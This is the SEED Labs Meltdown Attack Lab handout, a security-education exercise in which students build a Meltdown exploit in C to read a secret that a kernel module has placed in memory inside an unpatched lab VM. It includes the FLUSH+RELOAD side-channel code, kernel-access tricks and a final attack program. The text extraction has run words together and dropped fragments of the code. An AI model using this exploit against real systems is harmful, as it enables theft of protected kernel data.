SEEDLabsŒMeltdownAttackLab 1 MeltdownAttackLab Copyright©2018WenliangDu SyracuseUniversity ThisworkislicensedunderaCreativeCommonsAttribution-NonCommercial-ShareAlike4.0International License.Ahuman-readablesummaryof andnotasubstitutefor thelicenseisthefollowing Youarefreeto copyandredistributethematerialinanymediumorformat.Youmustgiveappropriatecredit.Ifyouremix transform orbuilduponthematerial youmustdistributeyourcontributionsunderthesamelicenseasthe original.Youmaynotusethematerialforcommercialpurposes 1Introduction Discoveredin2017andpubliclydisclosedinJanuary2018 theMeltdownexploitscriticalvulnerabilities existinginmanymodernprocessors includingthosefromIntelandARM 6 .Thevulnerabilitiesallow auser-levelprogramtoreaddatastoredinsidethekernelmemory.Suchanaccessisnotallowedbythe hardwareprotectionmechanismimplementedinmostCPUs butavulnerabilityexistsinthedesignofthese CPUsthatmakesitpossibletodefeatthehardwareprotection.Becausethewexistsinthehardware itisverydiftofundamentallytheproblem unlesswechangetheCPUsinourcomputers.The MeltdownvulnerabilityrepresentsaspecialgenreofvulnerabilitiesinthedesignofCPUs.Alongwiththe Spectrevulnerability theyprovideaninvaluablelessonforsecurityeducation Thelearningobjective ofthislabisforstudentstogainexperiencesontheMeltdownattack Theattackitselfisquitesophisticated sowebreakitdownintoseveralsmallsteps eachofwhichiseasy tounderstandandperform.Oncestudentsunderstandeachstep itshouldnotbedifforthemtoput everythingtogethertoperformtheactualattack.StudentswillusetheMeltdownattacktoprintoutasecret datastoredinsidethekernel.Thislabcoversanumberoftopicsdescribedinthefollowing Ł Meltdownattack Ł Sidechannelattack Ł CPUCaching Ł Out-of-orderexecutioninsideCPUmicroarchitecture Ł Kernelmemoryprotectioninoperatingsystem Ł Kernelmodule LabEnvironment Thislabhasbeentestedonourpre-builtUbuntu12.04VMandUbuntu16.04VM bothofwhichcanbedownloadedfromtheSEEDwebsite.TheUbuntu16.04VMisstillinthebetatesting stage sofrequentchangesareexpected.ItwillbeofreleasedinSummer2018fortheFallsemester Whenusingthislab instructorsshouldkeepthefollowingsinmind First theMeltdownvulnerabilityis awinsideIntelCPUs soifastudent'smachineisanAMDmachine theattackwillnotwork.Second IntelisworkingonthisprobleminitsCPUs soifastudent'scomputerusesnewIntelCPUs attackmaynotwork.Itisnotaproblemfornow February2018 butsixmonthsfromnow situationslike thismayarise.Third althoughmoststudents'computershavealreadybeenpatched theattackisconducted insideourpre-builtVM whichisnotpatched sotheattackwillstillbeeffective.Therefore studentsshould notupdatetheVM'soperatingsystem ortheattackmaybeed Acknowledgment ThislabwasdevelopedwiththehelpofHaoZhangandKuberKohli graduatestudents intheDepartmentofElectricalEngineeringandComputerScienceatSyracuseUniversity SEEDLabsŒMeltdownAttackLab 2 2CodeCompilation Formostofourtasks youneedtoadd -march=native whencompilingthecodewith gcc .The march tellsthecompilertoenableallinstructionsubsetssupportedbythelocalmachine.Forexample wecompile myprog.c usingthefollowingcommand $ gcc-march=native-omyprogmyprog.c 3Tasks1and2 SideChannelAttacksviaCPUCaches BoththeMeltdownandSpectreattacksuseCPUcacheasasidechanneltostealaprotectedsecret.The techniqueusedinthisside-channelattackiscalledFLUSH+RELOAD 7 .Wewillstudythistechnique Thecodedevelopedinthesetwotaskswillbeusedasabuildingblockinlatertasks ACPUcacheisahardwarecacheusedbytheCPUofacomputertoreducetheaveragecost timeor energy toaccessdatafromthemainmemory.AccessingdatafromCPUcacheismuchfasterthanaccessing fromthemainmemory.Whendataarefetchedfromthemainmemory theyareusuallycachedbytheCPU soifthesamedataareusedagain theaccesstimewillbemuchfaster.Therefore whenaCPUneedsto accesssomedata itrstlooksatitscaches.Ifthedataisthere thisiscalledcachehit itwillbefetched directlyfromthere.Ifthedataisnotthere thisiscalledmiss theCPUwillgotothemainmemorytoget thedata.Thetimespentinthelattercaseislonger.MostmodernCPUshaveCPUcaches Figure1 Cachehitandmiss 3.1Task1 ReadingfromCacheversusfromMemory Thecachememoryisusedtoprovidedatatothehighspeedprocessorsatafasterspeed.Thecache memoriesareveryfastcomparedtothemainmemory.Letusseethetimedifference.Inthefollow- ingcode CacheTime.c wehaveanarrayofsize 10 * 4096 .Weaccesstwoofitselements array 3 * 4096 array 7 * 4096 .Therefore thepagescontainingthesetwoelementswillbe cached.Wethenreadtheelementsfrom array 0 * 4096 array 9 * 4096 andmeasurethetime spentinthememoryreading.Figure1illustratesthedifference.Inthecode Line À readstheCPU'stimes- tamp TSC counterbeforethememoryread whileLine Á readsthecounterafterthememoryread.Their differenceisthetime intermsofnumberofCPUcycles spentinthememoryread.Itshouldbenotedthat cachingisdoneatthecacheblocklevel notatthebytelevel.Atypicalcacheblocksizeis64bytes.Weuse array k * 4096 sonotwoelementsusedintheprogramfallintothesamecacheblock SEEDLabsŒMeltdownAttackLab 3 Listing1 CacheTime.c # include < emmintrin.h > # include < x86intrin.h > uint8_tarray 10 * 4096 intmain intargc constchar ** argv { intjunk=0 registeruint64_ttime1 time2 volatileuint8_t * addr inti //Initializethearray i=0 < 10 i++ array * 4096 =1 //FLUSHthearrayfromtheCPUcache i=0 < 10 i++ _mm_clflush & array * 4096 //Accesssomeofthearrayitems array 3 * 4096 =100 array 7 * 4096 =200 i=0 < 10 i++ { addr= & array * 4096 time1=__rdtscp & junk À junk= * addr time2=__rdtscp & junk -time1 Á printf `` Accesstimeforarray % * 4096 % dCPUcycles\n '' int time2 } return0 } Pleasecompilethefollowingcodeusing gcc-march=nativeCacheTime.c andrunit.Isthe accessof array 3 * 4096 array 7 * 4096 fasterthanthatoftheotherelements ? Youshould runtheprogramatleast10timesanddescribeyourobservations.Fromtheexperiment youneedtoa thresholdthatcanbeusedtodistinguishthesetwotypesofmemoryaccess accessingdatafromthecache versusaccessingdatafromthemainmemory.Thisthresholdisimportantfortherestofthetasksinthislab 3.2Task2 UsingCacheasaSideChannel Theobjectiveofthistaskistousethesidechanneltoextractasecretvalueusedbythevictimfunction Assumethereisavictimfunctionthatusesasecretvalueasindextoloadsomevaluesfromanarray.Also assumethatthesecretvaluecannotbeaccessedfromtheoutside.Ourgoalistousesidechannelstogetthis secretvalue.ThetechniquethatwewillbeusingiscalledFLUSH+RELOAD 7 .Figure2illustratesthe technique whichconsistsofthreesteps 1 FLUSHtheentirearrayfromthecachememorytomakesurethearrayisnotcached 2 Invokethevictimfunction whichaccessesoneofthearrayelementsbasedonthevalueofthesecret Thisactioncausesthecorrespondingarrayelementtobecached 3 RELOADtheentirearray andmeasurethetimeittakestoreloadeachelement.Ifone element'sloadingtimeisfast itisverylikelythatelementisalreadyinthecache.Thiselementmust betheoneaccessedbythevictimfunction.Therefore wecanoutwhatthesecretvalueis SEEDLabsŒMeltdownAttackLab 4 Figure2 DiagramdepictingtheSideChannelAttack ThefollowingprogramusestheFLUSH+RELOADtechniquetooutaone-bytesecretvaluecon- tainedinthevariable secret .Sincethereare256possiblevaluesforaone-bytesecret weneedtomap eachvaluetoanarrayelement.Thenaivewayistoanarrayof256elements i.e. array 256 However thisdoesnotwork.Cachingisdoneatablocklevel notatabytelevel.If array k isac- cessed ablockofmemorycontainingthiselementwillbecached.Therefore theadjacentelementsof array k willalsobecached makingitdiftoinferwhatthesecretis.Tosolvethisproblem wecre- ateanarrayof 256 * 4096 bytes.EachelementusedinourRELOADstepis array k * 4096 .Because 4096 islargerthanatypicalcacheblocksize 64bytes notwodifferentelements array * 4096 array j * 4096 willbeinthesamecacheblock Since array 0 * 4096 mayfallintothesamecacheblockasthevariablesintheadjacentmemory itmaybeaccidentallycachedduetothecachingofthosevariables.Therefore weshouldavoidusing array 0 * 4096 intheFLUSH+RELOADmethod forotherindex k array k * 4096 doesnothave aproblem .Tomakeitconsistentintheprogram weuse array k * 4096+DELTA forall k values DELTA isasaconstant 1024 Listing2 FlushReload.c # include < emmintrin.h > # include < x86intrin.h > uint8_tarray 256 * 4096 inttemp charsecret=94 * cachehittimethresholdassumed * # defineCACHE_HIT_THRESHOLD 80 # defineDELTA1024 voidflushSideChannel { inti //WritetoarraytobringittoRAMtopreventCopy-on-write i=0 < 256 i++ array * 4096+DELTA =1 SEEDLabsŒMeltdownAttackLab 5 //Flushthevaluesofthearrayfromcache i=0 < 256 i++ _mm_clflush & array * 4096+DELTA } voidvictim { temp=array secret * 4096+DELTA } voidreloadSideChannel { intjunk=0 registeruint64_ttime1 time2 volatileuint8_t * addr inti i=0 < 256 i++ { addr= & array * 4096+DELTA time1=__rdtscp & junk junk= * addr time2=__rdtscp & junk -time1 time2 < =CACHE_HIT_THRESHOLD { printf `` array % * 4096+ % isincache.\n '' DELTA printf `` TheSecret= % d.\n '' } } } intmain intargc constchar ** argv { flushSideChannel victim reloadSideChannel return 0 } Pleasecompiletheprogramusingandrunit seeSection2forcompilationinstruction .Itshouldbe notedthatthetechniqueisnot100percentaccurate andyoumaynotbeabletoobservetheexpectedoutput allthetime.Runtheprogramforatleast20times andcounthowmanytimesyouwillgetthesecret correctly.Youcanalsoadjustthethreshold CACHE HIT THRESHOLD totheonederivedfromTask1 80 isusedinthiscode 4Tasks3-5 PreparationfortheMeltdownAttack Memoryisolationisthefoundationofsystemsecurity.Inmostoperatingsystems kernelmemoryisnot directlyaccessibletouser-spaceprograms.Thisisolationisachievedbyasupervisorbitoftheprocessor thatwhetheramemorypageofthekernelcanbeaccessedornot.ThisbitissetwhenCPUenters thekernelspaceandclearedwhenitexitstotheuserspace 3 .Withthisfeature kernelmemorycanbe safelymappedintotheaddressspaceofeveryprocess sothepagetabledoesnotneedtochangewhena user-levelprogramtrapsintothekernel.However thisisolationfeatureisbrokenbytheMeltdownattack whichallowunprivilegeduser-levelprogramstoreadarbitrarykernelmemory SEEDLabsŒMeltdownAttackLab 6 4.1Task3 PlaceSecretDatainKernelSpace Tosimplifyourattack westoreasecretdatainthekernelspace andweshowhowauser-levelprogram canoutwhatthesecretdatais.Weuseakernelmoduletostorethesecretdata.Theimplementationof thekernelmoduleisprovidedin MeltdownKernel.c .Students'taskistocompileandinstallthekernel module.Thecodeisshownbelow Listing3 MeltdownKernel.c staticcharsecret 8 = { 'S ' ' E ' ' E ' 'D ' ' L ' ' ' ' b ' 's ' } staticstructproc_dir_entry * secret_entry staticchar * secret_buffer staticinttest_proc_open structinode * inode structfile * file { # ifLINUX_VERSION_CODE < =KERNEL_VERSION 4,0,0 returnsingle_open file NULL PDE inode - > data # else returnsingle_open file NULL PDE_DATA inode # endif } staticssize_tread_proc structfile * filp char * buffer size_tlength loff_t * offset { memcpy secret_buffer & secret,8 À return8 } staticconststructfile_operationstest_proc_fops= { .owner=THIS_MODULE .open=test_proc_open .read=read_proc .llseek=seq_lseek .release=single_release } static__initinttest_proc_init void { //writemessageinkernelmessagebuffer printk `` secretdataaddress % p\n '' & secret Á secret_buffer= char * vmalloc 8 //createdataentryin/proc secret_entry=proc_create_data `` secret_data '' 0444 NULL & test_proc_fops NULL Â secret_entry return0 return-ENOMEM } SEEDLabsŒMeltdownAttackLab 7 static__exitvoidtest_proc_cleanup void { remove_proc_entry `` secret_data '' NULL } module_init test_proc_init module_exit test_proc_cleanup Twoimportantconditionsneedtobeheld orMeltdownattackswillbequitediftosucceed.Inour kernelmodule weensurethattheconditionsaremet Ł Weneedtoknowtheaddressofthetargetsecretdata.Thekernelmodulesavestheaddressofthe secretdataintothekernelmessagebuffer Line Á whichispublicaccessible wewillgettheaddress fromthere.InrealMeltdownattacks attackershavetooutawaytogettheaddress orthey havetoguess Ł Thesecretdataneedtobecached ortheattack'ssuccessratewillbelow.Thereasonforthiscondition willbeexplainedlater.Toachievethis wejustneedtousethesecretonce.Wecreateadataentry /proc/secret data Line Â whichprovidesawindowforuser-levelprogramstointeractwith thekernelmodule.Whenauser-levelprogramreadsfromthisentry read proc functionin thekernelmodulewillbeinvoked insidewhich thesecretvariablewillbeloaded Line À andthus becachedbytheCPU.Itshouldbenotedthat read proc doesnotreturnthesecretdatatothe userspace soitdoesnotleakthesecretdata.WestillneedtousetheMeltdownattacktogetthe secret Compilationandexecution Downloadthecodefromthelabwebsite andgotothedirectorythatcon- tains Mak MeltdownKernel.c .Typethe make commandtocompilethekernelmodule.Toinstall thiskernelmodule usethe insmod command.Oncewehavesuccessfullyinstalledthekernelmodule canusethe dmesg commandtothesecretdata'saddressfromthekernelmessagebuffer.Takeanote ofthisaddress asweneeditlater $ make $ sudoinsmodMeltdownKernel.ko $ dmesg|grep'secretdataaddress' secretdataaddress:0xfb61b000 4.2Task4 AccessKernelMemoryfromUserSpace Nowweknowtheaddressofthesecretdata letusdoanexperimenttoseewhetherwecandirectlyget thesecretfromthisaddressornot.Youcanwriteyourowncodeforthisexperiment.Weprovideacode sampleinthefollowing.FortheaddressinLine À youshouldreplaceitwiththeaddressobtainedfromthe previoustask.Compileandrunthisprogram oryourowncode anddescribeyourobservation.Willthe programsucceedinLine Á ? CantheprogramexecuteLine Á ? intmain { char * kernel_data_addr= char * 0xfb61b000 À charkernel_data= * kernel_data_addr Á printf `` Ihavereachedhere.\n '' Â return0 } SEEDLabsŒMeltdownAttackLab 8 4.3Task5 HandleError/ExceptionsinC FromTask4 youhaveprobablylearnedthataccessingakernelmemoryfromtheuserspacewillcausethe programtocrash.IntheMeltdownattack weneedtodosomethingafteraccessingthekernelmemory wecannotlettheprogramcrash.AccessingprohibitedmemorylocationwillraiseaSIGSEGVsignal aprogramdoesnothandlethisexceptionbyitself theoperatingsystemwillhandleitandterminatethe program.Thatiswhytheprogramcrashes.Thereareseveralwaystopreventprogramsfromcrashingby acatastrophicevent.Onewayistoourownsignalhandlerintheprogramtocapturetheexceptions raisedbycatastrophicevents UnlikeC++orotherhigh-levellanguages Cdoesnotprovidedirectsupportforerrorhandling also knownasexceptionhandling suchasthetry/catchclause.However wecanemulatethetry/catchclause using sigsetjmp siglongjmp .WeprovideaCprogramcalled ExceptionHandling.c inthefollowingtodemonstratehowaprogramcancontinuetoexecuteevenifthereisacriticalexception suchasmemoryaccessviolation.Pleaserunthiscode anddescribeyourobservations Listing4 ExceptionHandling.c staticsigjmp_bufjbuf staticvoidcatch_segv { //Rollbacktothecheckpointsetbysigsetjmp siglongjmp jbuf,1 À } intmain { //Theaddressofoursecretdata unsignedlongkernel_data_addr=0xfb61b000 //Registerasignalhandler signal SIGSEGV catch_segv Á sigsetjmp jbuf,1 ==0 { Â //ASIGSEGVsignalwillberaised charkernel_data= * char * kernel_data_addr Ã //Thefollowingstatementwillnotbeexecuted printf `` Kerneldataataddress % luis % c\n '' kernel_data_addr kernel_data } else { printf `` Memoryaccessviolation ! \n '' } printf `` Programcontinuestoexecute.\n '' return0 } Theexceptionhandlingmechanismintheabovecodeisquitecomplicated soweprovidefurtherexpla- nationinthefollowing Ł Setupasignalhandler weregistera SIGSEGV signalhandlerinLine Á sowhena SIGSEGV signal SEEDLabsŒMeltdownAttackLab 9 israised thehandlerfunction catch segv willbeinvoked Ł Setupacheckpoint afterthesignalhandlerhasprocessingtheexception itneedstoletthe programcontinueitsexecutionfromparticularcheckpoint.Therefore weneedtoacheckpoint Thisisachievedvia sigsetjmp inLine Â sigsetjmp jbuf,1 savesthestack context/environmentin jbuf forlateruseby siglongjmp itreturns0whenthecheckpointis setup 4 Ł Rollbacktoacheckpoint When siglongjmp jbuf,1 iscalled thestatesavedinthe jbuf variableiscopiedbackintheprocessorandcomputationstartsoverfromthereturnpointofthe sigsetjmp function butthereturnedvalueofthe sigsetjmp functionisthesecondar- gumentofthe siglongjmp function whichis 1 inourcase.Therefore aftertheexception handling theprogramcontinuesitsexecutionfromthe else branch Ł Triggeringtheexception ThecodeatLine Ã willtriggera SIGSEGV signalduetothememory accessviolation user-levelprogramscannotaccesskernelmemory 5Task6 Out-of-OrderExecutionbyCPU Fromtheprevioustasks weknowthatifaprogramtriestoreadkernelmemory theaccesswillfailand anexceptionwillberaised.Usingthefollowingcodeasanexample weknowthatLine3willraisean exceptionbecausethememoryataddress 0xfb61b000 belongstothekernel.Therefore theexecution willbeinterruptedatLine3 andLine4willneverbeexecuted sothevalueofthe number variablewill stillbe0 1number=0 2 * kernel_address= char * 0xfb61b000 3kernel_data= * kernel_address 4number=number+kernel_data TheabovestatementaboutthecodeexampleistruewhenlookingfromoutsideoftheCPU.However isnotcompletelytrueifwegetintotheCPU andlookattheexecutionsequenceatthemicroarchitectural level.Ifwedothat wewilloutthatLine3willsuccessfullygetthekerneldata andLine4and subsequentinstructionswillbeexecuted.Thisisduetoanimportantoptimizationtechniqueadoptedby modernCPUs.Itiscalledout-of-orderexecution Insteadofexecutingtheinstructionsstrictlyintheiroriginalorder modernhighperformanceCPUs allowout-of-orderexecutiontoexhaustalloftheexecutionunits.Executinginstructionsoneafteranother mayleadtopoorperformanceandinefresourcesusage i.e. currentinstructioniswaitingforprevious instructiontocompleteeventhoughsomeexecutionunitsareidle 2 .Withtheout-of-orderexecution feature CPUcanrunaheadoncetherequiredresourcesareavailable Inthecodeexampleabove atthemicroarchitecturallevel Line3involvestwooperations loadthe data usuallyintoaregister andcheckwhetherthedataaccessisallowedornot.Ifthedataisalready intheCPUcache theoperationwillbequitefast whilethesecondoperationmaytakeawhile.To avoidwaiting theCPUwillcontinueexecutingLine4andsubsequentinstructions whileconductingthe accesscheckinparallel.Thisisout-of-orderexecution.Theresultsoftheexecutionwillnotbecommitted beforetheaccesscheckInourcase thecheckfails soalltheresultscausedbytheout-of-order executionwillbediscardedlikeithasneverhappened.ThatiswhyfromoutsidewedonotseethatLine4 wasexecuted.Figure3illustratestheout-of-orderexecutioncausedbyLine3ofthesamplecode SEEDLabsŒMeltdownAttackLab 10 Figure3 Out-of-orderexecutioninsideCPU IntelandseveralCPUmakersmadeaseveremistakeinthedesignoftheout-of-orderexecution.They wipeouttheeffectsoftheout-of-orderexecutiononregistersandmemoryifsuchanexecutionisnot supposedtohappen sotheexecutiondoesnotleadtoanyvisibleeffect.However theyforgotonething effectonCPUcaches.Duringtheout-of-orderexecution thereferencedmemoryisfetchedintoaregister andisalsostoredinthecache.Iftheout-of-orderexecutionhastobediscarded thecachecausedbysuchan executionshouldalsobediscarded.Unfortunately thisisnotthecaseinmostCPUs.Therefore itcreates anobservableeffect.Usingtheside-channeltechniquedescribedinTasks1and2 wecanobservesuchan effect.TheMeltdownattackcleverlyusesthisobservableeffecttooutsecretvaluesinsidethekernel memory Inthistask weuseanexperimenttoobservetheeffectcausedbyanout-of-orderexecution.Thecode forthisexperimentisshownbelow.Inthecode Line À willcauseanexception soLine Á willnotbe executed.However duetotheout-of-orderexecution Line Á isexecutedbytheCPU buttheresultwill eventuallybediscarded.However becauseoftheexecution array 7 * 4096+DELTA willnow becachedbyCPU.Weusetheside-channelcodeimplementedinTasks1and2tocheckwhetherwecan observetheeffect.Pleasedownloadthecodefromthelabwebsite runitanddescribeyourobservations.In particular pleaseprovideanevidencetoshowthatLine Á isactuallyexecuted Listing5 MeltdownExperiment.c voidmeltdown unsignedlongkernel_data_addr { charkernel_data=0 //Thefollowingstatementwillcauseanexception kernel_data= * char * kernel_data_addr À array 7 * 4096+DELTA +=1 Á } //Signalhandler staticsigjmp_bufjbuf staticvoidcatch_segv { siglongjmp jbuf,1 } SEEDLabsŒMeltdownAttackLab 11 intmain { //Registerasignalhandler signal SIGSEGV catch_segv //FLUSHtheprobingarray flushSideChannel sigsetjmp jbuf,1 ==0 { meltdown 0xfb61b000 Â } else { printf `` Memoryaccessviolation ! \n '' } //RELOADtheprobingarray reloadSideChannel return0 } ItshouldbenotedthattheaddressinLine Â shouldbereplacedbytheactualaddressthatyoufound fromthekernelmodule.Compileandrunthecode seeSection2fortheinstructionsonthecompilation Documentandexplainyourobservations 6Task7 TheBasicMeltdownAttack Theout-of-orderexecutioncreatesanopportunityforustoreaddatafromthekernelmemory andthenuse thedatatoconductoperationsthatcancauseobservableeffectsontheCPUcache.HowfaraCPUcangoin theout-of-orderexecutiondependsonhowslowtheaccesscheck whichisdoneinparallel isperformed Thisisatypicalraceconditionsituation.Inthistask wewillexploitthisraceconditiontostealasecret fromthekernel 6.1Task7.1 ANaiveApproach Intheprevioustask wecanget array 7 * 4096+DELTA intotheCPUcache.Althoughwecan observethateffect wedonotgetanyusefulinformationaboutthesecret.Ifinsteadofusing array 7 * 4096+DELTA weaccess array kernel data * 4096+DELTA whichbringsitinto theCPUcache.UsingtheFLUSH+RELOADtechnique wechecktheaccesstimeof array * 4096 +DELTA i=0 ,255 .Ifweoutthatonly array k * 4096+DELTA isinthe cache wecaninferthatthevalueofthe kernel data k .Pleasetrythisapproachbymodifying MeltdownExperiment.c showninListing5.Pleasedescribeyourobservations.Evenifyourattackis notsuccessful youshouldnotedownyourobservation andcontinueontoTask7.2 whichisintendedto improvetheattack 6.2Task7.2 ImprovetheAttackbyGettingtheSecretDataCached Meltdownisaraceconditionvulnerability whichinvolvestheracingbetweentheout-of-orderexecution andtheaccesscheck.Thefastertheout-of-orderexecutionis themoreinstructionswecanexecute andthe morelikelywecancreateanobservableeffectthatcanhelpusgetthesecret.Letuslookseehowwecan maketheout-of-orderexecutionfaster SEEDLabsŒMeltdownAttackLab 12 Thestepoftheout-of-orderexecutioninourcodeinvolvesloadingthekerneldataintoaregister Atthesametime thesecuritycheckonsuchanaccessisperformed.Ifthedataloadingisslowerthan securitycheck i.e. whenthesecuritycheckisdone thekerneldataisstillonitswayfromthememoryto theregister theout-of-orderexecutionwillbeimmediatelyinterruptedanddiscarded becausetheaccess checkfails.Ourattackwillfailaswell IfthekerneldataisalreadyintheCPUcache loadingthekerneldataintoaregisterwillbemuchfaster andwemaybeabletogettoourcriticalinstruction theonethatloadsthearray beforethefailedcheck abortsourout-of-orderexecution.Inpractice ifakerneldataitemisnotcached usingMeltdowntosteal thedatawillbedifHowever asithasbeendemonstrated Meltdownattackscanstillbesuccessful buttheyrequirehigh-performanceCPUandDRAM 5 Inthislab wewillgetthekernelsecretdatacachedbeforelaunchingtheattack.Inthekernelmodule showninListing3 weletuser-levelprogramtoinvokeafunctioninsidethekernelmodule.Thisfunction willaccessthesecretdatawithoutleakingittotheuser-levelprogram.Thesideeffectofthisaccessis thatthesecretdataisnowintheCPUcache.WecanaddthecodetoourattackprogramusedinTask7.1 beforetriggeringtheout-of-orderexecution.Pleaserunyourattackprogramandseewhetheryour successrateisimprovedornot //Openthe/proc/secret_datavirtualfile intfd=open `` /proc/secret_data '' O_RDONLY fd < 0 { perror `` open '' return-1 } intret=pread fd NULL,0,0 //Causethesecretdatatobecached 6.3Task7.3 UsingAssemblyCodetoTriggerMeltdown Youprobablystillcannotsucceedintheprevioustask evenwithsecretdatabeingcachedbyCPU.Letusdo onemoreimprovementbyaddingafewlinesofassemblyinstructionsbeforethekernelmemoryaccess.See thecodein meltdown asm below.Thecodebasicallydoaloopfor400times seeLine À insidethe loop itsimplyaddanumber 0x141 tothe eax register.Thiscodebasicallydoesuselesscomputations accordingtoapostdiscussion theseextralinesofcodeﬁgivethealgorithmicunitssomethingtochewwhile memoryaccessisbeingspeculatedﬂ 1 .Thisisanimportanttricktoincreasethepossibilityofsuccess Listing6 meltdown asm voidmeltdown_asm unsignedlongkernel_data_addr { charkernel_data=0 //Giveeaxregistersomethingtodo asmvolatile '' .rept400 '' À '' add $ 0x141 % % eax '' '' .endr '' Á '' eax '' SEEDLabsŒMeltdownAttackLab 13 //Thefollowingstatementwillcauseanexception kernel_data= * char * kernel_data_addr array kernel_data * 4096+DELTA +=1 } Pleasecallthe meltdown asm function insteadoftheoriginal meltdown function.Describe yourobservations.Increaseanddecreasethenumberofloops andreportyourresults 7Task8 MaketheAttackMorePractical Evenwiththeoptimizationintheprevioustask wemaystillnotbeablegetthesecretdataeverytime sometimes ourattackproducesthecorrectsecretvalue butsometimes ourattackfailstoidentifyanyvalue orawrongvalue.Toimprovetheaccuracy wecanuseastatisticaltechnique.Theideaiscreate ascorearrayofsize256 oneelementforeachpossiblesecretvalue.Wethenrunourattackformultiple times.Eachtime ifourattackprogramsaysthat k isthesecret thisresultmaybefalse weadd1to scores k .Afterrunningtheattackformanytimes weusethevalue k withthehighestscoreasour estimationofthesecret.Thiswillproduceamuchreliableestimationthantheonebasedonasingle run.Therevisedcodeisshowninthefollowing Listing7 MeltdownAttack.c staticintscores 256 voidreloadSideChannelImproved { inti volatileuint8_t * addr registeruint64_ttime1 time2 intjunk=0 i=0 < 256 i++ { addr= & array * 4096+DELTA time1=__rdtscp & junk junk= * addr time2=__rdtscp & junk -time1 time2 < =CACHE_HIT_THRESHOLD scores ++ * ifcachehit add1forthisvalue * } } //Signalhandler staticsigjmp_bufjbuf staticvoidcatch_segv { siglongjmp jbuf,1 } intmain { inti j ret=0 //Registersignalhandler signal SIGSEGV catch_segv intfd=open `` /proc/secret_data '' O_RDONLY SEEDLabsŒMeltdownAttackLab 14 fd < 0 { perror `` open '' return-1 } memset scores,0 sizeof scores flushSideChannel //Retry1000timesonthesameaddress i=0 < 1000 i++ { ret=pread fd NULL,0,0 ret < 0 { perror `` pread '' break } //Flushtheprobingarray j=0 j < 256 j++ _mm_clflush & array j * 4096+DELTA sigsetjmp jbuf,1 ==0 { meltdown_asm 0xfb61b000 } reloadSideChannelImproved } //Findtheindexwiththehighestscore intmax=0 i=0 < 256 i++ { scores max < scores max=i } printf `` Thesecretvalueis % % c\n '' max max printf `` Thenumberofhitsis % d\n '' scores max return0 } Pleasecompileandrunthecode andexplainyourobservations.Thecodeaboveonlystealsaone-byte secretfromthekernel.Theactualsecretplacedinthekernelmodulehas8bytes.Youneedtomodifythe abovecodetogetallthe8bytesofthesecret 8Submission Youneedtosubmitadetailedlabreport withscreenshots todescribewhatyouhavedoneandwhatyou haveobserved.Youalsoneedtoprovideexplanationtotheobservationsthatareinterestingorsurprising Pleasealsolisttheimportantcodesnippetsfollowedbyexplanation.Simplyattachingcodewithoutany explanationwillnotreceivecredits SEEDLabsŒMeltdownAttackLab 15 References 1 PavelBoldin.Explainsaboutlittleassemblycode # 33 https //github.com/paboldin/ meltdown-exploit/issues/33 ,2018 2 Wikipediacontributors.Out-of-orderexecutionŠwikipedia thefreeencyclopedia https //en.wikipedia.org/w/index.php ? title=Out-of-order_execution & oldid=826217063 ,2018. Online accessed21-February-2018 3 Wikipediacontributors.ProtectionringŠwikipedia thefreeencyclopedia https //en wikipedia.org/w/index.php ? title=Protection_ring & oldid=819149884 ,2018 Online accessed21-February-2018 4 TheOpenGroup sigsetjmp -setjumppointforanon-localgoto http //pubs.opengroup org/onlinepubs/7908799/xsh/sigsetjmp.html ,1997 5 IAIK.Githubrepositoryformeltdowndemonstration https //github.com/IAIK/ meltdown/issues/9 ,2018 6 MoritzLipp MichaelSchwarz DanielGruss ThomasPrescher WernerHaas StefanMangard Paul Kocher DanielGenkin YuvalYarom andMikeHamburg.Meltdown ArXive-prints January2018 7 YuvalYaromandKatrinaFalkner.Flush+reload Ahighresolution lownoise l3cacheside-channel attack.In Proceedingsofthe23rdUSENIXConferenceonSecuritySymposium SEC'14 pages719Œ 732 Berkeley CA USA,2014.USENIXAssociation 